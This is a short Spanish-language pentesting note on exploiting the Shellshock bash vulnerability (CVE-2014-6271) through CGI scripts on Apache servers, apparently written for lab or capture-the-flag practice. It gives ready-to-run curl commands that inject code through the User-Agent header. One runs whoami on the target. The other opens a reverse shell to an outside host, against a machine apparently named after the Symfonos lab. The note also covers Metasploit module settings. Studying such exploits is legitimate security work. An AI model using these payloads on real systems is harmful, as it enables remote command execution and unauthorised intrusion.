### Shellshock (CVE-2014-6271)
Vulnerabilidad que nos permite llegar a ejecutar comandos de manera remota en la víctima, si tiene una versión de bash relativamente antigua. El tema aquí es encontrar binarios **cgi** en un servidor web **Apache** por ejemplo.

#### Enumeracion
SI al realizar fuzzing descubrimos el típico directorio **/cgi-bin** probablemente estemos de suerte.  *debemos hacer fuzzing sobre cgi-bin* Una vez localizado un binario **.cgi, pl, sh**, anotamos su ubicación, ej:
```bash
http://102.196.45.32/cgi-bin/status
```

#### Explotación con CURL o Burpsuite
Basta con manipular la cabecera **User-Agent** para llegar a acontecer la vulnerabilidad. 
```bash
curl -s http://102.196.45.32/cgi-bin/status -H "User-Agent: () { :; }; echo; echo; /usr/bin/whoami"

curl -H 'User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/192.168.50.128/9001 0>&1' http://symfonos3.local/cgi-bin/underworld
```
__Si no funciona con curl, pasarlo por burpsuite y mandar al repeater__

#### Explotacion con metasploit
buscar con "search shellshock", y en caso de apache localizarlo y utilizarlo. Lo importante al completar las "options" es establecer bien la "TARGETURI", que es la ruta hacia el binario cgi, pl, sh...

#Ejemplo: TARGETURI= /cgi-bin/prueba.cgi (no hay que meter la URL completa)